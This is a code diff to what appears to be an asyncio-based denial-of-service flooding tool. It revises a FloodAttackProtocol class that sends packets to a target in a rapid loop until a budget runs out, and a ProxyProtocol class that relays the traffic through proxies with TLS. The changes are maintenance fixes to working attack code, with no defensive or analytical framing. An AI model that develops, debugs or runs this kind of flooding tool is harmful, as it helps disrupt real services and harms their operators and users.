@@ -75,19 +75,16 @@ class FloodAttackProtocol(asyncio.Protocol):
 
     def _send_packet(self) -> None:
         if not self._transport: return
-        if self._paused:
-            self._handle = None
-        else:
-            packet, size = self._prepare_packet()
-            self._transport.write(packet)
-            self._stats.track(1, size)
-            self._budget -= 1
-            self._return_code = True
-            if self._budget > 0:
-                self._handle = self._loop.call_soon(self._send_packet)
-            else:
-                self._handle = None
-                self._transport.close()
+        packet, size = self._prepare_packet()
+        self._transport.write(packet)
+        self._stats.track(1, size)
+        self._budget -= 1
+        self._return_code = True
+        self._handle = None
+        if self._budget <= 0:
+            self._transport.close()
+        elif not self._paused and self._budget > 0:
+            self._handle = self._loop.call_soon(self._send_packet)
 
     def _handle_cancellation(self, on_close):
         if on_close.cancelled() and self._transport and not self._transport.is_closing():
@@ -195,13 +192,14 @@ class ProxyProtocol(asyncio.Protocol):
             self._dest_connect_timer = None
 
     def _setup_downstream_tls(self, task):
+        if not self._transport: return
         self._cancel_dest_connect_timer()
         try:
             transport = task.result()
             if transport:
                 self._downstream_protocol.connection_made(transport)
                 logger.debug(f"Dest is connected through {self._proxy_url}")
-            elif self._transport:
+            else:
                 self._transport.abort()
         except Exception as exc:
             if not self._on_close.done():
@@ -215,6 +213,7 @@ class ProxyProtocol(asyncio.Protocol):
             self._on_close.set_result(None)
         if self._transport is not None:
             self._transport.abort()
+            self._transport = None
 
 
 class ProxyError(IOError):
